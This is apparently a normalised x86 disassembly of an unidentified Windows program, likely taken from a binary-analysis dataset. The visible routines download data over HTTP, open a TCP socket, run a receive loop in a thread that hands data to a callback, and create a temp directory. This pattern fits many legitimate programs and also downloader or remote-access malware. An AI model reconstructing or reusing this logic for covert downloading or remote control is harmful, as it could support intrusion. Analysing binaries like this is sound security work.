cmp [ ebp - 0xcc6c ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xcd6c ] eax
mov eax [ ebp - 0xcd6c ]
mov [ ebp - 0xcd84 ] eax
mov [ ebp - 0xcd19 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xcd3c ]
mov [ ebp - 0xcd64 ] ecx
lea edx [ ebp - 0xcc6c ]
push edx
mov eax [ ebp - 0xcd64 ]
push eax
lea ecx [ ebp - 0xcc64 ]
push ecx
mov edx [ ebp - 0xcd28 ]
push edx
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0xcd38 ] 0x0
je r-xdata
mov edx [ ebp - 0xcd28 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0xcc6c ]
push eax
lea ecx [ ebp - 0xcc64 ]
push ecx
lea ecx [ ebp - 0xcca0 ]
call sub_414190
cmp [ ebp - 0xcd2c ] 0x0
jg r-xdata
jmp r-xdata
cmp [ ebp - 0xcd34 ] 0x0
je r-xdata
mov eax [ ebp - 0xcd38 ]
push eax
call [ InternetCloseHandle@IAT ]
jmp r-xdata
jmp r-xdata
movzx edx [ ebp - 0xcd19 ]
test edx edx
je r-xdata
mov ecx [ ebp - 0xcd34 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx 0x1
test edx edx
je r-xdata
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov ecx [ ebp - 0xcd20 ]
or ecx 0x1
mov [ ebp - 0xcd20 ] ecx
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xcca0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xccb8 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0xcc88 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xcca0 ]
call sub_401890
mov [ ebp - 0xcd48 ] eax
mov [ ebp - 0xcd1a ] 0x0
mov [ ebp - 0xcd30 ] 0xb
jmp r-xdata
mov ecx [ ebp - 0xcd48 ]
sub ecx 0xb
cmp [ ebp - 0xcd30 ] ecx
jge r-xdata
mov ecx [ ebp + 0x10 ]
movzx edx [ ecx ]
test edx edx
je r-xdata
push 0xb
mov edx [ ebp - 0xcd30 ]
sub edx 0xb
push edx
lea eax [ ebp - 0xcca0 ]
push eax
lea ecx [ ebp - 0xcdcc ]
call sub_40ffd0
mov [ ebp - 0xcd7c ] eax
mov ecx [ ebp - 0xcd7c ]
mov [ ebp - 0xcd60 ] ecx
mov [ ebp - 0x4 ] 0x5
push r--data
mov edx [ ebp - 0xcd60 ]
push edx
call sub_416540
add esp 0x8
mov [ ebp - 0xcd21 ] al
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xcdcc ]
call sub_401830
movzx eax [ ebp - 0xcd21 ]
test eax eax
je r-xdata
push r--data
lea eax [ ebp - 0xcc88 ]
push eax
call sub_416760
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
lea eax [ ebp - 0xcc88 ]
push eax
lea ecx [ ebp - 0xcdfc ]
push ecx
call sub_419470
add esp 0x8
mov [ ebp - 0xcd78 ] eax
mov edx [ ebp - 0xcd78 ]
push edx
lea ecx [ ebp - 0xcc88 ]
call sub_410070
lea ecx [ ebp - 0xcdfc ]
call sub_401830
push 0x9
mov ecx [ ebp - 0xcd30 ]
push ecx
lea edx [ ebp - 0xcca0 ]
push edx
lea ecx [ ebp - 0xcde4 ]
call sub_40ffd0
mov [ ebp - 0xcd68 ] eax
mov eax [ ebp - 0xcd68 ]
mov [ ebp - 0xcd54 ] eax
mov [ ebp - 0x4 ] 0x6
push r--data
mov ecx [ ebp - 0xcd54 ]
push ecx
call sub_416540
add esp 0x8
mov [ ebp - 0xcd22 ] al
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xcde4 ]
call sub_401830
movzx edx [ ebp - 0xcd22 ]
test edx edx
je r-xdata
mov [ ebp - 0xcd1a ] 0x1
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov eax [ ebp - 0xcd20 ]
or eax 0x1
mov [ ebp - 0xcd20 ] eax
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xcc88 ]
call sub_401830
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xcca0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xccb8 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0xcc65 ]
call sub_40c630
lea ecx [ ebp - 0xcc88 ]
call sub_401890
push eax
lea ecx [ ebp - 0xcc88 ]
call sub_401870
push eax
lea ecx [ ebp - 0xcc65 ]
call sub_40c790
mov [ ebp - 0xcd40 ] eax
mov edx [ ebp - 0xcd40 ]
push edx
lea ecx [ ebp - 0xccd0 ]
call sub_4017f0
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0xcd40 ]
push eax
call sub_422732
add esp 0x4
lea ecx [ ebp - 0xccd0 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_410020
mov edx [ ebp - 0xcd20 ]
or edx 0x1
mov [ ebp - 0xcd20 ] edx
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xccd0 ]
call sub_401830
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xcc88 ]
call sub_401830
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xcca0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xccb8 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
jmp r-xdata
movzx eax [ ebp - 0xcd1a ]
test eax eax
je r-xdata
mov [ ebp - 0xcd1a ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xcd30 ]
push ecx
lea ecx [ ebp - 0xcca0 ]
call sub_410210
mov dl [ eax ]
movzx eax dl
push eax
lea ecx [ ebp - 0xcc88 ]
call sub_4101f0
mov eax [ ebp - 0xcd30 ]
add eax 0x1
mov [ ebp - 0xcd30 ] eax
sub_419d9f
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xcc88 ]
call sub_401830
push r--data
mov ecx [ ebp + 0x8 ]
call sub_4017f0
mov ecx [ ebp - 0xcd20 ]
or ecx 0x1
mov [ ebp - 0xcd20 ] ecx
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xcca0 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xccb8 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_419e70
push ebp
mov ebp esp
mov eax 0x2814
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x2808 ] eax
mov ecx [ ebp - 0x2808 ]
mov edx [ ecx + 0x10 ]
push edx
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ ebp - 0x2808 ]
mov [ ebp - 0x2810 ] eax
mov ecx [ ebp - 0x2810 ]
push ecx
call j_sub_422732#2
add esp 0x4
cmp [ ebp - 0x2810 ] 0x0
jne r-xdata
push 0x2800
push 0x0
lea edx [ ebp - 0x2804 ]
push edx
call sub_427900
add esp 0xc
mov [ ebp - 0x280c ] 0x0
push 0x0
push 0x27ff
lea eax [ ebp - 0x2804 ]
push eax
mov ecx [ ebp - 0x2808 ]
mov edx [ ecx + 0x10 ]
push edx
call [ Ordinal_WSOCK32_16@IAT ]
mov [ ebp - 0x280c ] eax
cmp [ ebp - 0x280c ] 0xffffffff
jne r-xdata
mov [ ebp - 0x2808 ] 0x8123
mov edx [ ebp - 0x2808 ]
mov [ ebp - 0x2814 ] edx
mov [ ebp - 0x2814 ] 0x0
jmp r-xdata
cmp [ ebp - 0x280c ] 0x0
je r-xdata
mov eax [ ebp - 0x2808 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
mov eax [ ebp - 0x280c ]
push eax
lea ecx [ ebp - 0x2804 ]
push ecx
mov edx [ ebp - 0x2808 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x2808 ]
sub esp 0x10
mov edx esp
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
mov [ edx + 0x8 ] eax
mov ecx [ ecx + 0xc ]
mov [ edx + 0xc ] ecx
mov edx [ ebp - 0x2808 ]
mov eax [ edx + 0x14 ]
mov ecx [ ebp - 0x2808 ]
mov edx [ eax ]
mov ecx [ ecx + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x2808 ]
mov edx [ ecx + 0x18 ]
mov [ edx ] 0x0
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
sub_419fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bcf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x1b8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1b8 ]
mov [ eax + 0x14 ] 0x0
mov ecx 0x2
mov [ ebp - 0x1c4 ] cx
lea edx [ ebp - 0x1b0 ]
push edx
movzx eax [ ebp - 0x1c4 ]
push eax
call [ Ordinal_WSOCK32_115@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov edx 0x2
mov [ ebp - 0x20 ] dx
movzx eax [ ebp + 0x20 ]
push eax
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x1e ] ax
lea ecx [ ebp + 0x8 ]
call sub_401870
push eax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0x1c ] eax
push 0x6
push 0x1
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
mov ecx [ ebp + 0x24 ]
mov [ ecx ] eax
push 0x10
lea edx [ ebp - 0x20 ]
push edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
push ecx
call [ Ordinal_WSOCK32_4@IAT ]
cmp eax 0xffffffff
jne r-xdata
call [ Ordinal_WSOCK32_116@IAT ]
mov [ ebp - 0x1b2 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_401830
mov al [ ebp - 0x1b2 ]
jmp r-xdata
mov [ ebp - 0x1cc ] 0x1c
mov edx [ ebp - 0x1cc ]
push edx
call sub_42257f
add esp 0x4
mov [ ebp - 0x1c0 ] eax
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
call [ Ordinal_WSOCK32_116@IAT ]
mov [ ebp - 0x1b3 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_401830
mov al [ ebp - 0x1b3 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x24
mov [ ebp - 0x1c8 ] 0x0
mov eax [ ebp - 0x1cc ]
push eax
push 0x0
mov ecx [ ebp - 0x1c0 ]
push ecx
call sub_427900
add esp 0xc
mov edx [ ebp - 0x1c0 ]
mov [ ebp - 0x1c8 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c8 ]
mov [ ebp - 0x1bc ] eax
mov ecx [ ebp - 0x1bc ]
mov edx [ ebp + 0x24 ]
mov eax [ edx ]
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x1bc ]
mov edx [ ebp + 0x28 ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp - 0x1bc ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x1b8 ]
add eax 0x14
mov ecx [ ebp - 0x1bc ]
mov [ ecx + 0x18 ] eax
push 0x0
push 0x0
mov edx [ ebp - 0x1bc ]
push edx
push sub_419e70
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x1b8 ]
mov cx [ ebp + 0x20 ]
mov [ eax + 0x2 ] cx
mov edx [ ebp - 0x1b8 ]
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
mov [ edx + 0x10 ] ecx
mov edx [ ebp - 0x1b8 ]
mov [ edx + 0x14 ] 0x1
mov [ ebp - 0x1b1 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_401830
mov al [ ebp - 0x1b1 ]
sub_41a240
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
push 0x0
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
call [ Ordinal_WSOCK32_19@IAT ]
cmp eax 0xffffffff
je r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp - 0x8 ]
sub_41a2d0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a40
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
call sub_40c030
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x8 ]
call sub_4130a0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_41a380
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
movzx eax [ ebp - 0x2 ]
push eax
movzx ecx [ ebp - 0x3 ]
push ecx
lea ecx [ ebp - 0x4 ]
call sub_413390
push eax
mov ecx [ ebp - 0x8 ]
call sub_41a460
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41a3e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x10 ]
ja r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
sub edx [ ecx + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_412330
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_41a420
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0x10 ]
ja r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
sub edx [ ecx + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_41a5b0
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_41a460
push ebp
mov ebp esp
push 0xffffffff
push sub_43bcd3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x14 ]
call sub_402080
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x14 ]
call sub_41a630
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0xd ]
call sub_401d60
lea eax [ ebp - 0xd ]
push eax
mov ecx [ ebp - 0x14 ]
add ecx 0x8
call sub_414870
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x14 ]
movss xmm0 [ r--data ]
movss [ ecx + 0x1c ] xmm0
push 0x8
mov ecx [ ebp - 0x14 ]
call sub_413340
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_41a520
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call sub_402180
add esp 0x4
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call sub_402180
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ eax ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call sub_414860
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx ]
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
push ecx
call sub_402180
add esp 0x4
mov edx [ eax ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41a670
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
sub_41a5b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ r--data ]
sub ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c240
movzx edx al
test edx edx
je r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41a720
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40bff0
sub_41a670
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
mov edx [ ebp + 0x8 ]
push edx
call sub_414860
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4150a0
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
push 0x1
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_401d80
mov esp ebp
pop ebp
retn 0x4
sub_41a720
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x1
jne r-xdata
movzx eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_419e10
add esp 0xc
lea eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0d0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40bd30
add esp 0x8
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
sub_41a790
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cb70
mov ecx [ ebp - 0x4 ]
call sub_41a7c0
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_41a7e0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bd20
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
push 0x1
lea eax [ ebp - 0x11 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov ecx eax
call sub_41a900
mov [ ebp - 0x18 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x18 ]
push eax
call sub_402180
add esp 0x4
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x12 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x24 ] eax
lea edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x20 ]
push eax
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x24 ]
call sub_402130
mov ecx [ ebp - 0x18 ]
push ecx
call sub_414860
add esp 0x4
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x13 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov [ ebp - 0x2c ] eax
lea eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0x2c ]
call sub_402130
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] ecx
mov edx [ ebp - 0x18 ]
mov [ ebp + 0xc ] edx
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41a8b0
push 0x1
mov edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_401a60
mov ecx eax
call sub_401d80
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
sub_41a940
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x9249249
ja r-xdata
jmp r-xdata
call sub_4215c5
mov eax [ ebp + 0x8 ]
imul eax eax 0x1c
push eax
call sub_42257f
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41a980
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov cx [ ebp + 0xc ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x2
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
sub_41a9c0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bdc8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x2c ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x30 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_41a340
push eax
push 0x0
mov edx [ ebp + 0x10 ]
push edx
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40ffa0
mov eax [ ebp - 0x2c ]
or eax 0x1
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40ffa0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_41a2b0
push 0x0
push 0x0
mov edx [ ebp - 0x34 ]
push edx
push 0x0
lea ecx [ ebp - 0x28 ]
call sub_410210
push eax
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_41a340
push eax
push 0x0
mov ecx [ ebp + 0x10 ]
push ecx
call [ WideCharToMultiByte@IAT ]
lea edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_410020
mov eax [ ebp - 0x2c ]
or eax 0x1
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_401830
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_40ffa0
mov eax [ ebp - 0x2c ]
or eax 0x1
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
sub_41aaf0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x418 ] 0x0
xor eax eax
mov [ ebp - 0x414 ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x412 ]
push ecx
call sub_427900
add esp 0xc
push 0x104
lea edx [ ebp - 0x414 ]
push edx
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call sub_427900
add esp 0xc
lea ecx [ ebp - 0x20c ]
push ecx
push 0x0
push r--data
lea edx [ ebp - 0x414 ]
push edx
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
call [ CreateDirectoryW@IAT ]
lea edx [ ebp - 0x20c ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x418 ]
or eax 0x1
mov [ ebp - 0x418 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_41abd0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x418 ] 0x0
push 0x208
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call sub_427900
add esp 0xc
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
push 0x0
lea edx [ ebp - 0x414 ]
push edx
call sub_427900
add esp 0xc
lea eax [ ebp - 0x414 ]
push eax
push 0x0
push r--data
lea ecx [ ebp - 0x20c ]
push ecx
call [ GetTempFileNameW@IAT ]
lea edx [ ebp - 0x414 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40bd80
mov eax [ ebp - 0x418 ]
or eax 0x1
mov [ ebp - 0x418 ] eax
